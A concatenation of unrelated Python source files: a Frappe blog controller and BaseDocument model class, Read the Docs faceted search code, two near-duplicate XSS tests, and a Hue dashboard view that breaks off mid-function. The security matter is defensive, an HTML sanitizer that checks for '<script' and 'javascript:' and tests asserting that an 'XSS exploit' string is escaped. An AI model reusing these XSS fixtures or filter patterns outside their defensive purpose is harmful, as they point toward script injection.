	def on_update(self):
		clear_cache("writers")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception("This blog has not been published yet!")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc("Blogger", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			"name": self.title,
			"description": context.description,
		}

		if "<!-- markdown -->" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags["image"] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value("Blog Category",
			context.doc.blog_category, ["title", "route"], as_dict=1)
		context.parents = [{"name": _("Home"), "route":"/"},
			{"name": "Blog", "route": "/blog"},
			{"label": context.category.title, "route":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = "templates/includes/blog/blog.html",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category                    
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _("Posts filed under {0}").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value("Blogger", {"name": frappe.local.form_dict.blogger}, "full_name")
		list_context.sub_title = _("Posts by {0}").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by "{0}"').format(frappe.local.form_dict.txt)                    

	if list_context.sub_title:
		list_context.parents = [{"name": _("Home"), "route": "/"},
								{"name": "Blog", "route": "/blog"}]
	else:
		list_context.parents = [{"name": _("Home"), "route": "/"}]

	list_context.update(frappe.get_doc("Blog Settings", "Blog Settings").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql("""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list("""select route from
		`tabBlog Post` where ifnull(published,0)=1"""):
		clear_cache(blog)

	clear_cache("writers")

def get_blog_category(route):
	return frappe.db.get_value("Blog Category", {"name": route}, "title") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger="%s"' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category="%s"' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like "%{0}%" or t1.title like "%{0}%")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s""" % {
			"start": limit_start, "page_len": limit_page_length,
				"condition": (" and " + " and ".join(conditions)) if conditions else ""
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or ""
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not "http:" in post.avatar and not "https:" in post.avatar) and not post.avatar.startswith("/"):
			post.avatar = "/" + post.avatar

	return posts

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	"""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string."""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value("DocType", doctype, ("module", "custom"), cache=True) \
			or ["Core", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace(" ", "").replace("-", "")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = ("doctype", "_meta", "meta", "_table_fields", "_valid_columns")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, "__setup__"):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, "_meta"):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if "doctype" in d:
			self.set("doctype", d.get("doctype"))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if "doctype" in d:
			self.set("doctype", d.get("doctype"))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field "{0}" attached to child table of "{1}" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if "doctype" not in value:
				value["doctype"] = self.get_table_field_doctype(key)
				if not value["doctype"]:
					raise AttributeError(key)
			value = get_controller(value["doctype"])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, "idx", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, "name", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype=="Check":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype=="Int" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in ("Currency", "Float", "Percent") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in ("Datetime", "Date", "Time") and d[fieldname]=="":
					d[fieldname] = None

				elif df.get("unique") and cstr(d[fieldname]).strip()=="":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in ("idx", "docstatus") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in ("DocField", "DocPerm") and self.parent in ("DocType", "DocField", "DocPerm"):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get("__islocal")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc["doctype"] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in ("_user_tags", "__islocal", "__onload", "_liked_by", "__run_link_triggers"):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		"""INSERT the document (with valid columns) in the database."""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql("""insert into `tab{doctype}`
				({columns}) values ({values})""".format(
					doctype = self.doctype,
					columns = ", ".join(["`"+c+"`" for c in columns]),
					values = ", ".join(["%s"] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if "PRIMARY" in cstr(e.args[1]):
					if self.meta.autoname=="hash":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif "Duplicate" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set("__islocal", False)

	def db_update(self):
		if self.get("__islocal") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql("""update `tab{doctype}`
				set {values} where name=%s""".format(
					doctype = self.doctype,
					values = ", ".join(["`"+c+"`=%s" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and "Duplicate" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split("'")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if "unique_" in fieldname:
			fieldname = fieldname.split("_", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_("{0} must be unique".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set("modified", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get("fields"):
			if df.fieldtype == "Check":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == "Int":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in ("Float", "Currency", "Percent"):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		"""Get mandatory fields that do not have any values"""
		def get_msg(df):
			if df.fieldtype == "Table":
				return "{}: {}: {}".format(_("Error"), _("Data missing in table"), _(df.label))

			elif self.parentfield:
				return "{}: {} {} #{}: {}: {}".format(_("Error"), frappe.bold(_(self.doctype)),
					_("Row"), self.idx, _("Value missing for"), _(df.label))

			else:
				return _("Error: Value missing for {0}: {1}").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get("fields", {"reqd": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in ("parent", "parenttype"):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return "{} #{}: {}: {}".format(_("Row"), self.idx, _(df.label), docname)
			else:
				return "{}: {}".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get("fields", {"fieldtype": ('=', "Dynamic Link")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype=="Link":
					doctype = df.options
					if not doctype:
						frappe.throw(_("Options not set for link field {0}").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_("{0} must be set first").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != "amended_from"
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, "docstatus"))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname=="naming_series" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or "").split("\n")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith("_T-")):
				# show an elaborate message
				prefix = _("Row #{0}:").format(self.idx) if self.get("parentfield") else ""
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '", "'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be "{2}". It should be one of "{3}"').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get("fields", {"set_only_once": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_("Value cannot be changed for {0}").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get("length")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _("{0}, Row {1}").format(_(self.doctype), self.idx)

					else:
						reference = "{0} {1}".format(_(self.doctype), self.name)

					frappe.throw(_("{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype=="Table":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_("Not allowed to change {0} after submission").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		"""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		"""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u"<" not in value and u">" not in value):
				# doesn't look like html so no need
				continue

			elif "<!-- markdown -->" in value and not ("<script" in value or "javascript:" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get("fieldtype") in ("Data", "Code", "Small Text") and df.get("options")=="Email":
				sanitized_value = sanitize_email(value)

			elif df and (df.get("ignore_xss_filter")
						or (df.get("fieldtype")=="Code" and df.get("options")!="Email")
						or df.get("fieldtype") in ("Attach", "Attach Image")                    

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get("allow_on_submit"))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		"""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table."""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or "main"

		if not hasattr(self, "_precision"):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in ("Currency", "Float", "Percent"):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, "parent_doc", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		"""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = ["field1", "field2"]

		:param fieldname: Fieldname to be checked if hidden.
		"""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get("__print_hide"):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		"""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format."""
		doc = getattr(self, "parent_doc", self)

		if hasattr(doc, "format_data_map"):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		"""If the user does not have permissions at permlevel > 0, then reset the values to original / default"""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != "DocType":
			for df in self.meta.get("fields", {"fieldtype": ('=', "Text Editor")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	"""pass filters as:
		{"key": "val", "key": ["!=", "val"],
		"key": ["in", "val"], "key": ["not in", "val"], "key": "^val",
		"key" : True (exists), "key": False (does not exist) }"""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = ("not None", fval)
				elif fval is False:
					fval = ("None", fval)
				elif isinstance(fval, string_types) and fval.startswith("^"):
					fval = ("^", fval[1:])
				else:
					fval = ("=", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out

from elasticsearch_dsl import FacetedSearch, TermsFacet
from elasticsearch_dsl.query import SimpleQueryString, Bool                    


class RTDFacetedSearch(FacetedSearch):

    """Overwrite the initialization in order too meet our needs"""

    # TODO: Remove the overwrite when the elastic/elasticsearch-dsl-py#916
    # See more: https://github.com/elastic/elasticsearch-dsl-py/issues/916

    def __init__(self, using, index, doc_types, model, fields=None, **kwargs):
        self.using = using
        self.index = index
        self.doc_types = doc_types
        self._model = model
        if fields:
            self.fields = fields
        super(RTDFacetedSearch, self).__init__(**kwargs)


class ProjectSearch(RTDFacetedSearch):
    fields = ['name^5', 'description']
    facets = {
        'language': TermsFacet(field='language')
    }


class FileSearch(RTDFacetedSearch):
    facets = {
        'project': TermsFacet(field='project'),
        'version': TermsFacet(field='version')
    }

    def query(self, search, query):
        """
        Add query part to ``search``

        Overriding because we pass ES Query object instead of string
        """
        if query:
            search = search.query(query)

        return search

import pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """
        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;
        """.strip()
        assert results[0].meta.highlight.content[0][:len(expected)] == expected                    

import pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """
        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;                    
        """.strip()

        hits = results.hits.hits
        assert len(hits) == 1  # there should be only one result

        inner_hits = hits[0]['inner_hits']

        domain_hits = inner_hits['domains']['hits']['hits']
        assert len(domain_hits) == 0  # there shouldn't be any results from domains

        section_hits = inner_hits['sections']['hits']['hits']
        assert len(section_hits) == 1

        section_content_highlight = section_hits[0]['highlight']['sections.content']
        assert len(section_content_highlight) == 1

        assert expected in section_content_highlight[0]


#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging

from django.utils.html import escape
from django.utils.translation import ugettext as _

from django.core.urlresolvers import reverse
from desktop.conf import USE_NEW_EDITOR
from desktop.lib.django_util import JsonResponse, render
from desktop.lib.exceptions_renderable import PopupException
from desktop.models import Document2, Document

from search.conf import LATEST

from dashboard.dashboard_api import get_engine
from dashboard.decorators import allow_owner_only
from dashboard.models import Collection2
from dashboard.conf import get_engines
from dashboard.controller import DashboardController, can_edit_index


LOG = logging.getLogger(__name__)


DEFAULT_LAYOUT = [
     {"size":2,"rows":[{"widgets":[]}],"drops":["temp"],"klass":"card card-home card-column span2"},
     {"size":10,"rows":[{"widgets":[
         {"size":12,"name":"Filter Bar","widgetType":"filter-widget", "id":"99923aef-b233-9420-96c6-15d48293532b",
          "properties":{},"offset":0,"isLoading":True,"klass":"card card-widget span12"}]},
                        {"widgets":[
         {"size":12,"name":"Grid Results","widgetType":"resultset-widget", "id":"14023aef-b233-9420-96c6-15d48293532b",
          "properties":{},"offset":0,"isLoading":True,"klass":"card card-widget span12"}]}],
        "drops":["temp"],"klass":"card card-home card-column span10"},
]


def index(request, is_mobile=False):
  hue_collections = DashboardController(request.user).get_search_collections()
  collection_id = request.GET.get('collection')

  if not hue_collections or not collection_id:
    return admin_collections(request, True, is_mobile)

  try:
    collection_doc = Document2.objects.get(id=collection_id)
    if USE_NEW_EDITOR.get():
      collection_doc.can_read_or_exception(request.user)
    else:
      collection_doc.doc.get().can_read_or_exception(request.user)
    collection = Collection2(request.user, document=collection_doc)
  except Exception, e:
    raise PopupException(e, title=_("Dashboard does not exist or you don't have the permission to access it."))

  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  if request.method == 'GET':
    if 'q' in request.GET:
